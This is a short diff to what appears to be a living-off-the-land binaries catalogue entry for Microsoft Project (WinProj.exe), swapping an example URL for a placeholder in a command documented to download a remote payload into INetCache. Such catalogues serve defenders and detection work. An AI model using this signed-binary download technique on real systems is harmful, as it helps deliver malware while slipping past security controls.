@@ -4,7 +4,7 @@ Description: Microsoft Project Executable
 Author: Avihay Eldad
 Created: 2024-02-14
 Commands:
-  - Command: WinProj.exe https://example.com/payload
+  - Command: WinProj.exe {REMOTEURL}
     Description: Downloads payload from remote server
     Usecase: It will download a remote payload and place it in INetCache.
     Category: Download
